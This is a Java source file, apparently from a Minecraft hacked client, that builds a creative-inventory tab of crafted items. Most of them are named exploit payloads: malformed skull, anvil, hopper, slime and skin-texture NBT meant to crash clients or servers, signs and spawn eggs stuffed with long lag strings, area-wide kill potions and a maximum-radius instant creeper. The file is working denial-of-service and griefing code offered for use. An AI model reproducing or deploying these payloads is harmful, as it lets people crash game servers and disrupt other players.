package Method.Client.utils.Creativetabs;

import com.mojang.authlib.GameProfile;
import com.mojang.authlib.properties.Property;
import java.util.ArrayList;
import java.util.UUID;
import net.minecraft.client.Minecraft;
import net.minecraft.creativetab.CreativeTabs;
import net.minecraft.enchantment.Enchantment;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.inventory.EntityEquipmentSlot;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTException;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTUtil;
import net.minecraft.util.NonNullList;

public class CreativeTabFun extends CreativeTabs {
   ItemStack Blankspot;
   ArrayList<Enchantment> Enchants;
   ArrayList<Integer> Levels;

   public CreativeTabFun() {
      super("Fun");
      this.Blankspot = new ItemStack(Items.field_151118_aC);
      this.Enchants = new ArrayList();
      this.Levels = new ArrayList();
   }

   public String func_78013_b() {
      return "Fun";
   }

   public void func_78018_a(NonNullList<ItemStack> itemList) {
      this.Blankspot.func_190920_e(-1);

      try {
         Creativetabhelper.Attributeitems(Items.field_151130_bT, this.Enchants, this.Levels, itemList, EntityEquipmentSlot.HEAD, false);
         Creativetabhelper.Attributeitems(Items.field_151130_bT, this.Enchants, this.Levels, itemList, EntityEquipmentSlot.OFFHAND, false);
         ItemStack trollPotion = new ItemStack(Items.field_185155_bH);
         trollPotion.func_77964_b(16395);
         NBTTagList trollPotionEffects = new NBTTagList();

         NBTTagCompound effect;
         for(int i = 1; i <= 27; ++i) {
            effect = new NBTTagCompound();
            effect.func_74768_a("Amplifier", Integer.MAX_VALUE);
            effect.func_74768_a("Duration", Integer.MAX_VALUE);
            effect.func_74768_a("Id", i);
            trollPotionEffects.func_74742_a(effect);
         }

         trollPotion.func_77983_a("CustomPotionEffects", trollPotionEffects);
         trollPotion.func_151001_c("Â§cÂ§lTrollÂ§6Â§lPotion");
         itemList.add(trollPotion);
         ItemStack killPotion = new ItemStack(Items.field_185155_bH);
         killPotion.func_77964_b(16395);
         effect = new NBTTagCompound();
         effect.func_74768_a("Amplifier", 125);
         effect.func_74768_a("Duration", 1);
         effect.func_74768_a("Id", 6);
         NBTTagList effects = new NBTTagList();
         effects.func_74742_a(effect);
         killPotion.func_77983_a("CustomPotionEffects", effects);
         killPotion.func_151001_c("Â§cÂ§lKillÂ§6Â§lPotion");
         itemList.add(killPotion);
         ItemStack crashAnvil = new ItemStack(Blocks.field_150467_bQ);
         crashAnvil.func_151001_c("Â§8CrashÂ§cÂ§lAnvil Â§7| Â§cmc1.8-mc1.8");
         crashAnvil.func_77964_b(16384);
         itemList.add(crashAnvil);
         ItemStack crashHead = new ItemStack(Items.field_151144_bL);
         NBTTagCompound compound = new NBTTagCompound();
         compound.func_74778_a("SkullOwner", " ");
         crashHead.func_77982_d(compound);
         crashHead.func_151001_c("Â§8CrashÂ§6Â§lHead Â§7| Â§cmc1.8-mc1.10");
         itemList.add(crashHead);
         ItemStack Armorstand = new ItemStack(Items.field_179565_cj);
         Armorstand.func_77982_d(JsonToNBT.func_180713_a("{EntityTag:{Equipment:[{},{},{},{},{id:\"skull\",Count:1b,Damage:3b,tag:{SkullOwner:\"Test\"}}]}}"));
         itemList.add(Armorstand);
         ItemStack Armorstand2 = new ItemStack(Items.field_179565_cj);
         Armorstand2.func_151001_c("Â§cÂ§lArmor stand++");
         Armorstand2.func_77982_d(JsonToNBT.func_180713_a("{EntityTag:{NoBasePlate:1,ShowArms:1}}"));
         itemList.add(Armorstand2);
         ItemStack InstaCreeper = new ItemStack(Items.field_151063_bx);
         InstaCreeper.func_151001_c("Â§cÂ§lInsta Creeper");
         InstaCreeper.func_77982_d(JsonToNBT.func_180713_a("{EntityTag:{Fuse:-1,id:\"minecraft:creeper\",ignited:1,ExplosionRadius:127}}"));
         itemList.add(InstaCreeper);
         ItemStack CrashSlime = new ItemStack(Items.field_151063_bx);
         CrashSlime.func_151001_c("Â§cÂ§lCrash Slime");
         CrashSlime.func_77982_d(JsonToNBT.func_180713_a("{EntityTag:{Size:32767,id:\"minecraft:slime\"}}"));
         itemList.add(CrashSlime);
         ItemStack Firework = new ItemStack(Items.field_151152_bP);
         Firework.func_151001_c("Â§cÂ§lLong Firework");
         Firework.func_77982_d(JsonToNBT.func_180713_a("{Fireworks:{Flight:127,Explosions:[{Type:0,Trail:1b,Colors:[I;16711680],FadeColors:[I;16711680]}]}}"));
         itemList.add(Firework);
         ItemStack Fwork = new ItemStack(Items.field_151152_bP);
         Fwork.func_77982_d(JsonToNBT.func_180713_a("{Fireworks:{Flight:3}}"));
         itemList.add(Fwork);
         ItemStack CrashSkull = new ItemStack(Item.func_150899_d(397), 1, 3);
         NBTTagCompound nbt = new NBTTagCompound();
         NBTTagCompound c = new NBTTagCompound();
         GameProfile prof = new GameProfile((UUID)null, "name");
         prof.getProperties().put("textures", new Property("Value", "eyJ0ZXh0\u00addXJlcyI6eyJTS0lOIjp7InVybCI6IiJ9fX0="));
         c.func_74778_a("Id", "9d744c33-f3c4-4040-a7fc-73b47c840f0c");
         NBTUtil.func_180708_a(c, prof);
         nbt.func_74782_a("SkullOwner", c);
         nbt.func_74757_a("crash", true);
         CrashSkull.field_77990_d = nbt;
         CrashSkull.func_151001_c("Hold me :D");
         itemList.add(CrashSkull);
         ItemStack Head = new ItemStack(Item.func_150899_d(397), 1, 3);
         Head.func_77983_a("SkullOwner", new NBTTagString(Minecraft.func_71410_x().field_71439_g.func_70005_c_()));
         itemList.add(Head);
         ItemStack Crashhopper = new ItemStack(Blocks.field_150438_bZ);
         Crashhopper.func_151001_c("Â§cÂ§lCrash hopper");
         Crashhopper.func_77982_d(JsonToNBT.func_180713_a("{BlockEntityTag:{Items:[{Slot:0,id:\"skull\",Count:64,tag:{SkullOwner:{Id:\"0\"}}}]}}"));
         itemList.add(Crashhopper);
         ItemStack Potion = new ItemStack(Items.field_185155_bH);
         Potion.func_77982_d(JsonToNBT.func_180713_a("{CustomPotionEffects:[{Duration:20,Id:6,Amplifier:253}]}"));
         itemList.add(Potion);
         ItemStack Linger = new ItemStack(Items.field_185156_bI);
         Linger.func_77982_d(JsonToNBT.func_180713_a("{CustomPotionEffects:[{Radius:100,Duration:20,Id:6,Amplifier:253}],HideFlags:32}"));
         itemList.add(Linger);
         StringBuilder lagStringBuilder = new StringBuilder();

         for(int j = 0; j < 500; ++j) {
            lagStringBuilder.append("/(!Â§()%/Â§)=/(!Â§()%/Â§)=/(!Â§()%/Â§)=");
         }

         ItemStack sign = new ItemStack(Items.field_151155_ap);
         sign.func_151001_c("Â§cÂ§lCrash sign");
         sign.func_77982_d(JsonToNBT.func_180713_a("{BlockEntityTag:{Text1:\"{\\\"text\\\":\\\"" + lagStringBuilder.toString() + "\\\"}\",Text2:\"{\\\"text\\\":\\\"" + lagStringBuilder.toString() + "\\\"}\",Text3:\"{\\\"text\\\":\\\"" + lagStringBuilder.toString() + "\\\"}\",Text4:\"{\\\"text\\\":\\\"" + lagStringBuilder.toString() + "\\\"}\"}}"));
         itemList.add(sign);
         ItemStack spawn = new ItemStack(Items.field_151057_cb);
         spawn.func_77982_d(JsonToNBT.func_180713_a("{display:{Name: \"" + lagStringBuilder.toString() + "\"}}"));
         itemList.add(spawn);
      } catch (NBTException var27) {
         var27.printStackTrace();
      }

      super.func_78018_a(itemList);
   }

   public ItemStack func_78016_d() {
      return new ItemStack(Items.field_151142_bV);
   }
}
